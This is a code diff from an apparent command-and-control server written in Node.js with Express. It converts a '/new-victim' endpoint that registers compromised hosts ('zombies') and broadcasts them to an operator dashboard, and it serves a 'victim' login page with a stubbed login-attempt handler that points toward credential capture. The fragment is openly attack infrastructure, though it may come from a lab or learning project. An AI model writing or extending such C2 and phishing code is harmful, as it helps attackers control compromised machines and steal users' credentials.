@@ -22,17 +22,24 @@ const setupCommandAndControl = async() => {
         res.sendFile(path.join(__dirname, '/c-and-c/command.html'));
     });
 
-    app.get('/new-victim', function(req, res) {
-        console.log(`New Victim connected, Host: ${req.query.host} `);
-        zombies.push(req.query.host);
-        io.emit('new-victim', req.query.host);
+    // app.get('/new-victim', function(req, res) {
+    //     console.log(`New Victim connected, Host: ${req.query.host} `);
+    //     zombies.push(req.query.host);
+    //     io.emit('new-victim', req.query.host);
+    // });
+    app.use(express.json());
+    app.post('/new-victim', function(req, res) {
+        const hostname = req.body.host;
+        zombies.push(hostname);
+        io.emit('new-victim', hostname);
+        console.log(`New victim connected, Host: ${hostname}`);
+        res.sendStatus(200);
     });
 
     io.on("connection", (socket) => {
         console.log("command and control socket connection established");
     });
 
-    // app.use('/command', router);
     server.listen(port, async() => {
         await open(`${host}/command`);
     });
@@ -51,6 +58,10 @@ const setupLogin = async() => {
     app.get('/login', function(req, res) {
         res.sendFile(path.join(__dirname, "/victim/login.html"));
     });
+
+    // app.post('/login-attempt', function(req, res) {
+    //     if(req.payload)
+    // })
 
     app.listen(port, async() => {
         await open(`${host}/login`);
